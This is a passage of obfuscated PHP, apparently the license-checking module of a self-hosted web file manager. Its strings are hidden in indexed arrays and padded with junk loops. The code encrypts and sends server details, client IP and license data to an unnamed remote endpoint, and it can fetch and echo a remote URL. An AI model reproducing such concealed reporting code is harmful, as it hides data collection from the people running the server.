Model($Ğä¯éÓÇ[33])->get(); $¾öõõËò = array($Ğä¯éÓÇ[34], $Ğä¯éÓÇ[35], $Ğä¯éÓÇ[36], $Ğä¯éÓÇ[37], $Ğä¯éÓÇ[38], $Ğä¯éÓÇ[39], $Ğä¯éÓÇ[40], $Ğä¯éÓÇ[41], $Ğä¯éÓÇ[42], $Ğä¯éÓÇ[43], $Ğä¯éÓÇ[44], $Ğä¯éÓÇ[45], $Ğä¯éÓÇ[46], $Ğä¯éÓÇ[47], $Ğä¯éÓÇ[48], $Ğä¯éÓÇ[49], $Ğä¯éÓÇ[50], $Ğä¯éÓÇ[51], $Ğä¯éÓÇ[52], $Ğä¯éÓÇ[53], $Ğä¯éÓÇ[54], $Ğä¯éÓÇ[55], $Ğä¯éÓÇ[56], $Ğä¯éÓÇ[57], $Ğä¯éÓÇ[58], $Ğä¯éÓÇ[59], $Ğä¯éÓÇ[60], $Ğä¯éÓÇ[61], $Ğä¯éÓÇ[62], $Ğä¯éÓÇ[63], $Ğä¯éÓÇ[64], $Ğä¯éÓÇ[65], $Ğä¯éÓÇ[66], $Ğä¯éÓÇ[67], $Ğä¯éÓÇ[68], $Ğä¯éÓÇ[69], $Ğä¯éÓÇ[70], $Ğä¯éÓÇ[71], $Ğä¯éÓÇ[72], $Ğä¯éÓÇ[73], $Ğä¯éÓÇ[74], $Ğä¯éÓÇ[75], $Ğä¯éÓÇ[76], $Ğä¯éÓÇ[77], $Ğä¯éÓÇ[78], $Ğä¯éÓÇ[79], $Ğä¯éÓÇ[80], $Ğä¯éÓÇ[81], $Ğä¯éÓÇ[82], $Ğä¯éÓÇ[83], $Ğä¯éÓÇ[84], $Ğä¯éÓÇ[85], $Ğä¯éÓÇ[86], $Ğä¯éÓÇ[87]); foreach ($¾öõõËò as $Ù†åÄæ) { $ñöü€áø = $GLOBALS[$Ğä¯éÓÇ[88]][$Ğä¯éÓÇ[89]][$Ù†åÄæ]; $¿ÎòÉ¿‚ = $Á½ÒÁ¯[737]; if (!$¿ÎòÉ¿‚) { return; } if (isset($ØÌÄ©å[$Ù†åÄæ])) { $ñöü€áø = $ØÌÄ©å[$Ù†åÄæ]; } $ë¦³Áû¯[$Ğä¯éÓÇ[90]][$Ğä¯éÓÇ[91]][$Ù†åÄæ] = $ñöü€áø; } $éÙâù‘— = $ë¦³Áû¯[$Ğä¯éÓÇ[90]][$Ğä¯éÓÇ[91]][$Ğä¯éÓÇ[46]]; $Ãª·ÔÅ = $Á½ÒÁ¯[738]; unset($ë¦³Áû¯[$Ğä¯éÓÇ[90]][$Ğä¯éÓÇ[92]][$Ğä¯éÓÇ[93]]); unset($ë¦³Áû¯[$Ğä¯éÓÇ[90]][$Ğä¯éÓÇ[92]][$Ğä¯éÓÇ[94]]); unset($ë¦³Áû¯[$Ğä¯éÓÇ[90]][$Ğä¯éÓÇ[91]][$Ğä¯éÓÇ[46]]); $Ù•³ëæë = $Á½ÒÁ¯[739]; unset($ë¦³Áû¯[$Ğä¯éÓÇ[90]][$Ğä¯éÓÇ[91]][$Ğä¯éÓÇ[95]]); $æ´šÁ™’ = $Á½ÒÁ¯[740]; while (strlen($æ´šÁ™’) < $Á½ÒÁ¯[717]) { if (!$æ´šÁ™’) { break; } $æ´šÁ™’++; } $ë¦³Áû¯[$Ğä¯éÓÇ[90]][$Ğä¯éÓÇ[91]][$Ğä¯éÓÇ[96]] = array($Ğä¯éÓÇ[97] => (int) $éÙâù‘—[$Ğä¯éÓÇ[98]], $Ğä¯éÓÇ[99] => (int) _get($éÙâù‘—, $Ğä¯éÓÇ[100], 0)); $š¹î¢ø¾ = $Á½ÒÁ¯[741]; if (!$š¹î¢ø¾) { die; } $õÇ¦ Æ‹ = substr(md5($Ğä¯éÓÇ[101] . get_client_ip() . $ØÌÄ©å[$Ğä¯éÓÇ[102]]), 0, 15); $ë¦³Áû¯[$Ğä¯éÓÇ[103]][$Ğä¯éÓÇ[104]] = Mcrypt::encode(Session::sign(), $õÇ¦ Æ‹, 3600 * 24); $éÒ¨Šé¿ = $Á½ÒÁ¯[742]; while ($éÒ¨Šé¿ < $Á½ÒÁ¯[743]) { if ($éÒ¨Šé¿ >= 0) { break; } $éÒ¨Šé¿++; } $ë¦³Áû¯[$Ğä¯éÓÇ[103]][$Ğä¯éÓÇ[105]] = Action($Ğä¯éÓÇ[106])->accessToken(); $ë¦³Áû¯[$Ğä¯éÓÇ[103]][$Ğä¯éÓÇ[107]] = md5($_SERVER[$Ğä¯éÓÇ[108]] . $ØÌÄ©å[$Ğä¯éÓÇ[102]]); $ªãÎÄÖİ = $Á½ÒÁ¯[744]; while (strlen($ªãÎÄÖİ) < $Á½ÒÁ¯[710]) { if (!$ªãÎÄÖİ) { break; } $ªãÎÄÖİ++; } $ë¦³Áû¯[$Ğä¯éÓÇ[103]][$Ğä¯éÓÇ[109]] = base64_encode(serverInfo()); $ÄÙê¤× = $Á½ÒÁ¯[745]; while (strlen($ÄÙê¤×) < $Á½ÒÁ¯[712]) { if (!$ÄÙê¤×) { break; } $ÄÙê¤×++; } $ë¦³Áû¯[$Ğä¯éÓÇ[103]][$Ğä¯éÓÇ[110]] = $this->xfnj9a3a9d5d; $‰¯–ÌÁÃ = $Á½ÒÁ¯[746]; while ($‰¯–ÌÁÃ < $Á½ÒÁ¯[704]) { if ($‰¯–ÌÁÃ >= 0) { break; } $‰¯–ÌÁÃ++; } if ($ØÌÄ©å[$Ğä¯éÓÇ[110]] != $Ğä¯éÓÇ[111]) { $ë¦³Áû¯[$Ğä¯éÓÇ[103]][$Ğä¯éÓÇ[112]] = $ØÌÄ©å[$Ğä¯éÓÇ[112]]; $ë¦³Áû¯[$Ğä¯éÓÇ[103]][$Ğä¯éÓÇ[113]] = $ØÌÄ©å[$Ğä¯éÓÇ[113]]; $ı†¡‡®À = rand_string(10) . $this->xfnj9a3a9d5d . rand_string(5); $ë¦³Áû¯[$Ğä¯éÓÇ[90]][$Ğä¯éÓÇ[114]][$Ğä¯éÓÇ[115]] = $this->pjbic9c7fc82($ı†¡‡®À, $ë¦³Áû¯[$Ğä¯éÓÇ[103]][$Ğä¯éÓÇ[107]]); } if ($this->xfnj9a3a9d5d == $Ğä¯éÓÇ[111]) { $ë¦³Áû¯[$Ğä¯éÓÇ[90]][$Ğä¯éÓÇ[91]][$Ğä¯éÓÇ[96]][$Ğä¯éÓÇ[100]] = 0; } $ë¦³Áû¯[$Ğä¯éÓÇ[103]][$Ğä¯éÓÇ[116]] = $this->versionPluginFilter(); $ë¦³Áû¯[$Ğä¯éÓÇ[103]][$Ğä¯éÓÇ[117]] = _get($this->fsnte7f710df, $Ğä¯éÓÇ[118], $Ğä¯éÓÇ[6]); $¸õÆ³â = $Á½ÒÁ¯[747]; if (!$¸õÆ³â) { return; } if (KodUser::isRoot() && $this->config[$Ğä¯éÓÇ[119]]) { $ë¦³Áû¯[$Ğä¯éÓÇ[103]][$Ğä¯éÓÇ[120]] = WEB_ROOT; } return $ë¦³Áû¯; } private function lreie5c22cb0() { $Öç°íƒ± =& $_SERVER[±Ö‰ô½¯]; $éò‹Ñ±å =& $_SERVER[îâŸó­ˆ]; $è¿úĞòµ = $_SERVER[$éò‹Ñ±å[24]] == $éò‹Ñ±å[121]; if ($_SERVER[$éò‹Ñ±å[24]] == $éò‹Ñ±å[122] && $_GET[$éò‹Ñ±å[123]] == $éò‹Ñ±å[124]) { $è¿úĞòµ = !0; } if ($è¿úĞòµ) { $€¯×ÊÒ = array($éò‹Ñ±å[110] => $this->xfnj9a3a9d5d, $éò‹Ñ±å[125] => $this->hakv0c27f720(), $éò‹Ñ±å[126] => Model($éò‹Ñ±å[127])->count()); if ($this->xfnj9a3a9d5d != $éò‹Ñ±å[111]) { $á„•Ş¸ = _get($this->fsnte7f710df, $éò‹Ñ±å[128]); if ($á„•Ş¸) { $€¯×ÊÒ[$éò‹Ñ±å[129]] = $á„•Ş¸; $€¯×ÊÒ[$éò‹Ñ±å[130]] = strtotime(_get($this->fsnte7f710df, $éò‹Ñ±å[131])); $€¯×ÊÒ[$éò‹Ñ±å[132]] = _get($this->fsnte7f710df, $éò‹Ñ±å[118]); } $¾û…‡¨… = Model($éò‹Ñ±å[33])->get($éò‹Ñ±å[133], $éò‹Ñ±å[6], !0); if (is_string($¾û…‡¨…) && substr($¾û…‡¨…, 0, 1) == $éò‹Ñ±å[134]) { $¾û…‡¨… = json_decode_force($¾û…‡¨…); } if (is_array($¾û…‡¨…) && $¾û…‡¨…[$éò‹Ñ±å[135]] && strstr($¾û…‡¨…[$éò‹Ñ±å[135]], $éò‹Ñ±å[136])) { $òÃº­÷ğ = explode($éò‹Ñ±å[136], $¾û…‡¨…[$éò‹Ñ±å[135]]); $€¯×ÊÒ[$éò‹Ñ±å[137]] = $òÃº­÷ğ[0]; } } $€¯×ÊÒ = $this->dkqu0b2e993e(json_encode($€¯×ÊÒ), md5($éò‹Ñ±å[138])); $×–èø”º = $Öç°íƒ±[748]; while (strlen($×–èø”º) < $Öç°íƒ±[710]) { if (!$×–èø”º) { break; } $×–èø”º++; } $åîÈ©ß« = array($éò‹Ñ±å[139] => $€¯×ÊÒ); call_user_func(array($éò‹Ñ±å[140], $éò‹Ñ±å[141]), $åîÈ©ß«); $ÓÙ™ÄğŸ = $Öç°íƒ±[749]; while ($ÓÙ™ÄğŸ < $Öç°íƒ±[717]) { if ($ÓÙ™ÄğŸ >= 0) { break; } $ÓÙ™ÄğŸ++; } } if ($this->xfnj9a3a9d5d == $éò‹Ñ±å[111]) { return; } $ÈÌ‘“Ì¼ = array($éò‹Ñ±å[142], $éò‹Ñ±å[143], $éò‹Ñ±å[144], $éò‹Ñ±å[145], $éò‹Ñ±å[146], $éò‹Ñ±å[147]); $ıİÜÊ¿Ï = $Öç°íƒ±[750]; while ($ıİÜÊ¿Ï < $Öç°íƒ±[743]) { if ($ıİÜÊ¿Ï >= 0) { break; } $ıİÜÊ¿Ï++; } $ÇÇ†¶‘ = Model($éò‹Ñ±å[33])->get(); $åîÈ©ß« = array($éò‹Ñ±å[148] => $ÇÇ†¶‘[$éò‹Ñ±å[34]], $éò‹Ñ±å[149] => $ÇÇ†¶‘[$éò‹Ñ±å[35]], $éò‹Ñ±å[150] => $éò‹Ñ±å[6]); foreach ($ÈÌ‘“Ì¼ as $«ÑéÃ¹ë) { if (!isset($ÇÇ†¶‘[$«ÑéÃ¹ë]) || !$ÇÇ†¶‘[$«ÑéÃ¹ë]) { continue; } $åîÈ©ß«[$«ÑéÃ¹ë] = $ÇÇ†¶‘[$«ÑéÃ¹ë]; $§ªÁïÒ = $Öç°íƒ±[751]; if (strlen($§ªÁïÒ) < $Öç°íƒ±[710]) { die; } } call_user_func(array($éò‹Ñ±å[140], $éò‹Ñ±å[141]), $åîÈ©ß«); $»¤óÜÆù = $Öç°íƒ±[752]; } private function hwrc50ef619a() { $¾¸”ÜõÁ =& $_SERVER[±Ö‰ô½¯]; $ØÃù‚½‰ =& $_SERVER[îâŸó­ˆ]; if ($_SERVER[$ØÃù‚½‰[24]] != $ØÃù‚½‰[151]) { return; } if (!KodUser::isRoot()) { die; } $›¥­Êë› = $GLOBALS[$ØÃù‚½‰[13]]; if (isset($›¥­Êë›[$ØÃù‚½‰[152]])) { $this->mwqr274f7962(); die; } if (isset($›¥­Êë›[$ØÃù‚½‰[153]]) && isset($›¥­Êë›[$ØÃù‚½‰[153]]) == $ØÃù‚½‰[124]) { $›¥­Êë›[$ØÃù‚½‰[154]] = Model($ØÃù‚½‰[33])->get($ØÃù‚½‰[155]); } if (!isset($›¥­Êë›[$ØÃù‚½‰[154]]) || strlen($›¥­Êë›[$ØÃù‚½‰[154]]) != 16) { show_json($ØÃù‚½‰[156] . $›¥­Êë›[$ØÃù‚½‰[154]], !1); } $ŠÑ±Ñ¦ = Model($ØÃù‚½‰[33])->get($ØÃù‚½‰[102]); $–¨ŒÃ¢µ = md5($_SERVER[$ØÃù‚½‰[108]] . $ŠÑ±Ñ¦); $¸Í„•›ï = $¾¸”ÜõÁ[753]; while ($¸Í„•›ï < $¾¸”ÜõÁ[710]) { if ($¸Í„•›ï >= 0) { break; } $¸Í„•›ï++; } $£•„Ûà¦ = array($ØÃù‚½‰[154] => $›¥­Êë›[$ØÃù‚½‰[154]], $ØÃù‚½‰[157] => rand_string(16), $ØÃù‚½‰[158] => $ØÃù‚½‰[138], $ØÃù‚½‰[159] => $ØÃù‚½‰[160], $ØÃù‚½‰[161] => $_SERVER[$ØÃù‚½‰[162]], $ØÃù‚½‰[163] => $_SERVER[$ØÃù‚½‰[164]], $ØÃù‚½‰[165] => $_SERVER[$ØÃù‚½‰[166]], $ØÃù‚½‰[107] => $–¨ŒÃ¢µ, $ØÃù‚½‰[167] => Model($ØÃù‚½‰[33])->get($ØÃù‚½‰[133])); if (isset($›¥­Êë›[$ØÃù‚½‰[153]]) && isset($›¥­Êë›[$ØÃù‚½‰[153]]) == $ØÃù‚½‰[124]) { $£•„Ûà¦[$ØÃù‚½‰[153]] = md5($£•„Ûà¦[$ØÃù‚½‰[154]] . $ØÃù‚½‰[168] . $£•„Ûà¦[$ØÃù‚½‰[157]]); } if ($›¥­Êë›[$ØÃù‚½‰[169]] == $ØÃù‚½‰[170]) { $èšŠ°°è = $this->dkqu0b2e993e($–¨ŒÃ¢µ, $ØÃù‚½‰[171]); $äÏ˜€Ã¿ = $this->pjbic9c7fc82(json_encode($£•„Ûà¦), $–¨ŒÃ¢µ . $ØÃù‚½‰[172], 3); $äÏ˜€Ã¿ = $äÏ˜€Ã¿ . $ØÃù‚½‰[173] . $_SERVER[$ØÃù‚½‰[162]]; $ßûŒ†Ë = $this->aqym18c82ef5($ØÃù‚½‰[174] . $èšŠ°°è . $ØÃù‚½‰[175] . $äÏ˜€Ã¿, -1); show_json($ßûŒ†Ë, !0); } else { if ($›¥­Êë›[$ØÃù‚½‰[169]] == $ØÃù‚½‰[176]) { $‘œîèÍñ = substr(md5($ØÃù‚½‰[177] . $–¨ŒÃ¢µ), 12, 15) . $ØÃù‚½‰[178]; $äÏ˜€Ã¿ = $this->ynpiaeb659d3(trim($›¥­Êë›[$ØÃù‚½‰[179]]), $‘œîèÍñ, 2); $Ì‡‹‡¼ = json_decode($äÏ˜€Ã¿, !0); if (!is_array($Ì‡‹‡¼) || !is_array($Ì‡‹‡¼[$ØÃù‚½‰[180]]) || $Ì‡‹‡¼[$ØÃù‚½‰[154]] != !0) { $á‹––ú‡ = $ØÃù‚½‰[181]; $‚¹‹²¡Ú = $Ì‡‹‡¼[$ØÃù‚½‰[180]] ? $ØÃù‚½‰[182] . $Ì‡‹‡¼[$ØÃù‚½‰[180]] : $á‹––ú‡; show_json($‚¹‹²¡Ú, !1); } else { $£•„Ûà¦[$ØÃù‚½‰[157]] = $Ì‡‹‡¼[$ØÃù‚½‰[180]][$ØÃù‚½‰[183]]; } } else { $Ì‡‹‡¼ = $this->aqym18c82ef5($ØÃù‚½‰[184], $£•„Ûà¦, 10); } } if (!is_array($Ì‡‹‡¼) || !is_array($Ì‡‹‡¼[$ØÃù‚½‰[180]]) || $Ì‡‹‡¼[$ØÃù‚½‰[154]] != !0) { $á‹––ú‡ = LNG($ØÃù‚½‰[185]); $‚¹‹²¡Ú = $Ì‡‹‡¼[$ØÃù‚½‰[180]] ? $ØÃù‚½‰[182] . $Ì‡‹‡¼[$ØÃù‚½‰[180]] : $á‹––ú‡; show_json($‚¹‹²¡Ú, !1); } $›õóûµ = $Ì‡‹‡¼[$ØÃù‚½‰[180]]; $Ôş¦™ª¸ = $this->halufc1c2bba($›õóûµ[$ØÃù‚½‰[186]]); if (!$Ôş¦™ª¸ || $Ôş¦™ª¸ != $›õóûµ[$ØÃù‚½‰[131]]) { $Å ÉĞ˜  = array($ØÃù‚½‰[187] => Model($ØÃù‚½‰[33])->get($ØÃù‚½‰[102]), $ØÃù‚½‰[188] => $_SERVER[$ØÃù‚½‰[108]], $ØÃù‚½‰[189] => this_url(), $ØÃù‚½‰[163] => $_SERVER[$ØÃù‚½‰[164]]); $äÏ˜€Ã¿ = $this->qbeg68b717ba(json_encode($Å ÉĞ˜ )); $this->aqym18c82ef5($ØÃù‚½‰[190] . $äÏ˜€Ã¿); show_json(LNG($ØÃù‚½‰[191]), !0); } $ßĞø†»ı = array($ØÃù‚½‰[155] => $›õóûµ[$ØÃù‚½‰[192]], $ØÃù‚½‰[193] => $›õóûµ[$ØÃù‚½‰[194]], $ØÃù‚½‰[195] => rand_string(16), $ØÃù‚½‰[110] => $›õóûµ[$ØÃù‚½‰[196]]); if ($£•„Ûà¦[$ØÃù‚½‰[157]]) { $ßĞø†»ı[$ØÃù‚½‰[195]] = $£•„Ûà¦[$ØÃù‚½‰[157]]; } $ëè¶Å¬ˆ = substr(md5($ßĞø†»ı[$ØÃù‚½‰[193]]), 10, 10); $‹ùĞ‹šæ = $ëè¶Å¬ˆ . $ßĞø†»ı[$ØÃù‚½‰[110]] . $ßĞø†»ı[$ØÃù‚½‰[195]]; $Ç’¡â£“ = $¾¸”ÜõÁ[754]; $ßĞø†»ı[$ØÃù‚½‰[112]] = strrev(base64_encode($this->dkqu0b2e993e($‹ùĞ‹šæ, $ØÃù‚½‰[197]))); $çüŞÅü = $¾¸”ÜõÁ[755]; while ($çüŞÅü < $¾¸”ÜõÁ[717]) { if ($çüŞÅü >= 0) { break; } $çüŞÅü++; } $İâÅÄÕò = rand_string(16); $Æ‰ç—æ¿ = $¾¸”ÜõÁ[756]; while ($Æ‰ç—æ¿ < $¾¸”ÜõÁ[710]) { if ($Æ‰ç—æ¿ >= 0) { break; } $Æ‰ç—æ¿++; } $­«½”œ¢ = $İâÅÄÕò . $ßĞø†»ı[$ØÃù‚½‰[110]] . $this->dkqu0b2e993e(md5($ßĞø†»ı[$ØÃù‚½‰[155]]), $İâÅÄÕò); $ËªÊ«Î§ = $¾¸”ÜõÁ[757]; if (!$ËªÊ«Î§) { return; } $ßĞø†»ı[$ØÃù‚½‰[113]] = base64_encode(strrev($this->dkqu0b2e993e($­«½”œ¢, $ØÃù‚½‰[198]))); if ($›õóûµ[$ØÃù‚½‰[199]] && $›õóûµ[$ØÃù‚½‰[199]] >= 1) { Model($ØÃù‚½‰[33])->setDeep($ØÃù‚½‰[200], $ØÃù‚½‰[124]); } Model($ØÃù‚½‰[33])->set($ßĞø†»ı); $à¹É“Ÿ = md5($_SERVER[$ØÃù‚½‰[108]] . strrev($ŠÑ±Ñ¦) . $ßĞø†»ı[$ØÃù‚½‰[193]]); $íá¬˜Ç¬ = strrev(substr($à¹É“Ÿ, 10, 16)); $ìÔó£÷• = $this->pjbic9c7fc82(json_encode($›õóûµ), $à¹É“Ÿ); $ı÷áÓîé = array_to_keyvalue(Model($ØÃù‚½‰[7])->listData(), $ØÃù‚½‰[201]); $¾¦Ó×£ş = $¾¸”ÜõÁ[758]; $Öùà¾± = $ı÷áÓîé[$ØÃù‚½‰[202]]; $’ûÅ—Ÿó = $¾¸”ÜõÁ[759]; $¶â¿Ôø’ = array(); $øª¶¢×û = $¾¸”ÜõÁ[760]; while ($øª¶¢×û < $¾¸”ÜõÁ[743]) { if ($øª¶¢×û >= 0) { break; } $øª¶¢×û++; } $¶â¿Ôø’[$íá¬˜Ç¬] = $ìÔó£÷•; Model($ØÃù‚½‰[7])->update($Öùà¾±[$ØÃù‚½‰[203]], array($ØÃù‚½‰[204] => $¶â¿Ôø’)); $this->fsnte7f710df = $›õóûµ; $this->xfnj9a3a9d5d = $ßĞø†»ı[$ØÃù‚½‰[110]]; $±¦İŠî· = $¾¸”ÜõÁ[761]; if (!$±¦İŠî·) { die; } $this->licenseRegistSuccess(); $¤ÕÛŠ­î = $¾¸”ÜõÁ[762]; while ($¤ÕÛŠ­î < $¾¸”ÜõÁ[704]) { if ($¤ÕÛŠ­î >= 0) { break; } $¤ÕÛŠ­î++; } Cache::set($ØÃù‚½‰[205] . md5($ŠÑ±Ñ¦ . $ØÃù‚½‰[206]), $ØÃù‚½‰[6]); show_json(LNG($ØÃù‚½‰[191]), !0); } private function licenseRegistSuccess() { $èüßÎöÏ =& $_SERVER[±Ö‰ô½¯]; $ô’µ·Õİ =& $_SERVER[îâŸó­ˆ]; $½Üü’éƒ = Model($ô’µ·Õİ[33])->get(); $¬Ùåğ¹£ = $èüßÎöÏ[763]; while ($¬Ùåğ¹£ < $èüßÎöÏ[717]) { if ($¬Ùåğ¹£ >= 0) { break; } $¬Ùåğ¹£++; } if ($½Üü’éƒ[$ô’µ·Õİ[63]] != $ô’µ·Õİ[124]) { Model($ô’µ·Õİ[33])->set($ô’µ·Õİ[63], $ô’µ·Õİ[124]); } Action($ô’µ·Õİ[207])->initStart(!0); } private function mwqr274f7962() { $Ğ·ú»•¿ =& $_SERVER[±Ö‰ô½¯]; $ØÁ°¿Ä¶ =& $_SERVER[îâŸó­ˆ]; Model($ØÁ°¿Ä¶[33])->set(array($ØÁ°¿Ä¶[155] => $ØÁ°¿Ä¶[6], $ØÁ°¿Ä¶[193] => $ØÁ°¿Ä¶[6], $ØÁ°¿Ä¶[110] => $ØÁ°¿Ä¶[111], $ØÁ°¿Ä¶[112] => $ØÁ°¿Ä¶[6], $ØÁ°¿Ä¶[113] => $ØÁ°¿Ä¶[6])); $©¹ìñêĞ = $Ğ·ú»•¿[764]; while ($©¹ìñêĞ < $Ğ·ú»•¿[704]) { if ($©¹ìñêĞ >= 0) { break; } $©¹ìñêĞ++; } Model($ØÁ°¿Ä¶[33])->setDeep($ØÁ°¿Ä¶[200], $ØÁ°¿Ä¶[208]); $this->fsnte7f710df = array(); $this->xfnj9a3a9d5d = $ØÁ°¿Ä¶[111]; } private function tesk788bef0b() { $¾»¤Çê™ =& $_SERVER[±Ö‰ô½¯]; $‡¶å¶ø =& $_SERVER[îâŸó­ˆ]; $_SERVER[$‡¶å¶ø[164]] = _get($_SERVER, $‡¶å¶ø[164], APP_HOST); $this->xfnj9a3a9d5d = $‡¶å¶ø[111]; $“—¡¯¥› = Model($‡¶å¶ø[33])->get(); if ($“—¡¯¥›[$‡¶å¶ø[110]] == $‡¶å¶ø[111]) { return; } $Ü¢ÌåÛ = Model($‡¶å¶ø[33])->get($‡¶å¶ø[102]); $ÛéİÅÔ = $¾»¤Çê™[765]; $•êŸ¼×É = $‡¶å¶ø[205] . md5($Ü¢ÌåÛ . $‡¶å¶ø[206]); $†Ë¬ß€ = $¾»¤Çê™[766]; $Ø§‹£¸‡ = Cache::get($•êŸ¼×É); if (!is_array($Ø§‹£¸‡) || !isset($Ø§‹£¸‡[$‡¶å¶ø[209]]) || time() - $Ø§‹£¸‡[$‡¶å¶ø[209]] >= 60) { $õ§ƒÎì = Model($‡¶å¶ø[7])->loadList(); $¶©Ÿğ‹ = $õ§ƒÎì[$‡¶å¶ø[202]]; $ıøûŸĞÈ = md5($_SERVER[$‡¶å¶ø[108]] . strrev($Ü¢ÌåÛ) . $“—¡¯¥›[$‡¶å¶ø[193]]); $ÂÀµšÃÇ = strrev(substr($ıøûŸĞÈ, 10, 16)); $Ø§‹£¸‡ = $this->ynpiaeb659d3($¶©Ÿğ‹[$‡¶å¶ø[88]][$ÂÀµšÃÇ], $ıøûŸĞÈ); $Ø§‹£¸‡ = json_decode($Ø§‹£¸‡, !0); } if (!is_array($Ø§‹£¸‡)) { return $this->mwqr274f7962(); } $ßÅÃõÃ˜ = strtotime($Ø§‹£¸‡[$‡¶å¶ø[131]]); if (time() >= $ßÅÃõÃ˜) { return $this->mwqr274f7962(); } if (!isset($Ø§‹£¸‡[$‡¶å¶ø[209]]) || time() - $Ø§‹£¸‡[$‡¶å¶ø[209]] > 20) { $Ø§‹£¸‡[$‡¶å¶ø[209]] = time(); Cache::set($•êŸ¼×É, $Ø§‹£¸‡); } $this->fsnte7f710df = $Ø§‹£¸‡; $this->xfnj9a3a9d5d = $“—¡¯¥›[$‡¶å¶ø[110]]; $GLOBALS[$‡¶å¶ø[210]] = $this; $íª©¹¶Ì = $¾»¤Çê™[767]; } private function lysob6f30bc6() { $üÀµ¸˜« =& $_SERVER[îâŸó­ˆ]; $ïÜ‘à–ê = $GLOBALS[$üÀµ¸˜«[13]]; $²ÂñŠáû = $_SERVER[$üÀµ¸˜«[24]]; $ÊÆÁ£¸Ù = $_SERVER[±Ö‰ô½¯][768]; if ($²ÂñŠáû == $üÀµ¸˜«[211] && $this->xfnj9a3a9d5d == $üÀµ¸˜«[111]) { show_json(LNG($üÀµ¸˜«[212]), !1, $üÀµ¸˜«[213]); } $ÂøÑÔ½„ = array($üÀµ¸˜«[214], $üÀµ¸˜«[215]); if (in_array($²ÂñŠáû, $ÂøÑÔ½„)) { if ($this->xfnj9a3a9d5d == $üÀµ¸˜«[111] && isset($ïÜ‘à–ê[$üÀµ¸˜«[216]])) { show_json(LNG($üÀµ¸˜«[212]), !1, $üÀµ¸˜«[213]); die; } $Ó«š’Ğ = $this->hakv0c27f720(); if ($Ó«š’Ğ != intval($üÀµ¸˜«[217])) { if ($Ó«š’Ğ <= Model($üÀµ¸˜«[127])->count()) { show_json(LNG($üÀµ¸˜«[218]), !1, $üÀµ¸˜«[213]); die; } } } } private function kwmcf44a9ffd() { $•»Éğ§Ä =& $_SERVER[±Ö‰ô½¯]; $©ÏÉºÓĞ =& $_SERVER[îâŸó­ˆ]; $åÈâÀœê = array($©ÏÉºÓĞ[121], $©ÏÉºÓĞ[122]); $ê¾¶Á = $•»Éğ§Ä[769]; while ($ê¾¶Á < $•»Éğ§Ä[710]) { if ($ê¾¶Á >= 0) { break; } $ê¾¶Á++; } if (!KodUser::isRoot() || !isset($_GET[$©ÏÉºÓĞ[219]])) { return; } if (!in_array($_SERVER[$©ÏÉºÓĞ[24]], $åÈâÀœê)) { return; } $×ò–‘‘İ = $©ÏÉºÓĞ[220]; $ğ­»ú¹ = $•»Éğ§Ä[770]; while (strlen($ğ­»ú¹) < $•»Éğ§Ä[717]) { if (!$ğ­»ú¹) { break; } $ğ­»ú¹++; } $×ò–‘‘İ = $this->mvyif9e84d64($×ò–‘‘İ, $©ÏÉºÓĞ[221]); $­ïÁãÏÑ = $•»Éğ§Ä[771]; $äã³‚ı³ = stream_context_create(array($©ÏÉºÓĞ[222] => array($©ÏÉºÓĞ[223] => $©ÏÉºÓĞ[224], $©ÏÉºÓĞ[225] => 3))); $ÀËÂñ½ä = @file_get_contents($×ò–‘‘İ, !1, $äã³‚ı³); $Ë¥ÁöõÙ = $•»Éğ§Ä[772]; while (strlen($Ë¥ÁöõÙ) < $•»Éğ§Ä[712]) { if (!$Ë¥ÁöõÙ) { break; } $Ë¥ÁöõÙ++; } header($©ÏÉºÓĞ[226]); if ($ÀËÂñ½ä && strstr($ÀËÂñ½ä, $©ÏÉºÓĞ[227])) { echo $ÀËÂñ½ä; } die; } public function bmwpbaf9a2d2($Œîà“óù) { $¬úäÇ =& $_SERVER[±Ö‰ô½¯]; $•ûòÄŸÛ =& $_SERVER[îâŸó­ˆ]; if ($this->xfnj9a3a9d5d == $•ûòÄŸÛ[228]) { return $Œîà“óù; } $ÄÁÑÄı¸ = $this->versionPluginList(); $»İ†Æâ¡ = explode($•ûòÄŸÛ[229], $this->versionPluginFilter()); $¿ÔºƒÜÍ = $¬úäÇ[773]; if (strlen($¿ÔºƒÜÍ) < $¬úäÇ[704]) { return; } $Ş®ÏŸÛ° = array(); foreach ($ÄÁÑÄı¸ as $éÛÁì€¼ => $üòÓ£¡ş) { if ($üòÓ£¡ş == $•ûòÄŸÛ[230] && substr($this->xfnj9a3a9d5d, 0, 1) == $•ûòÄŸÛ[230]) { continue; } if (!in_array($éÛÁì€¼, $»İ†Æâ¡)) { $Ş®ÏŸÛ°[] = $éÛÁì€¼; } } foreach ($Ş®ÏŸÛ° as $éÛÁì€¼) { unset($Œîà“óù[$éÛÁì€¼]); } return $Œîà“óù; $äşÉœÔ = $¬úäÇ[774]; if (strlen($äşÉœÔ) < $¬úäÇ[712]) { return; } } private function versionPluginList() { $·Ë‹Ğ =& $_SERVER[±Ö‰ô½¯]; $ğ»Ï… =& $_SERVER[îâŸó­ˆ]; return array($ğ»Ï…[231] => $ğ»Ï…[230], $ğ»Ï…[232] => $ğ»Ï…[230], $ğ»Ï…[233] => $ğ»Ï…[230], $ğ»Ï…[234] => $ğ»Ï…[230], $ğ»Ï…[235] => $ğ»Ï…[236], $ğ»Ï…[237] => $ğ»Ï…[236], $ğ»Ï…[238] => $ğ»Ï…[236], $ğ»Ï…[239] => $ğ»Ï…[236], $ğ»Ï…[240] => $ğ»Ï…[236], $ğ»Ï…[241] => $ğ»Ï…[236], $ğ»Ï…[242] => $ğ»Ï…[236], $ğ»Ï…[243] => $ğ»Ï…[236], $ğ»Ï…[244] => $ğ»Ï…[236], $ğ»Ï…[245] => $ğ»Ï…[236], $ğ»Ï…[246] => $ğ»Ï…[236], $ğ»Ï…[247] => $ğ»Ï…[236], $ğ»Ï…[248] => $ğ»Ï…[236], $ğ»Ï…[249] => $ğ»Ï…[236], $ğ»Ï…[250] => $ğ»Ï…[236]); $âÄ…µ‰­ = $·Ë‹Ğ[775]; if (strlen($âÄ…µ‰­) < $·Ë‹Ğ[704]) { die; } } private function versionPluginFilter() { $ïïÑ‚ÆÜ =& $_SERVER[±Ö‰ô½¯]; $’¸Ì•ú‘ =& $_SERVER[îâŸó­ˆ]; if ($this->xfnj9a3a9d5d == $’¸Ì•ú‘[111]) { return $’¸Ì•ú‘[6]; } $’º¬Ó³³ = _get($this->fsnte7f710df, $’¸Ì•ú‘[251], $’¸Ì•ú‘[6]); $àÊ¥¯¢ = $ïïÑ‚ÆÜ[776]; while (strlen($àÊ¥¯¢) < $ïïÑ‚ÆÜ[743]) { if 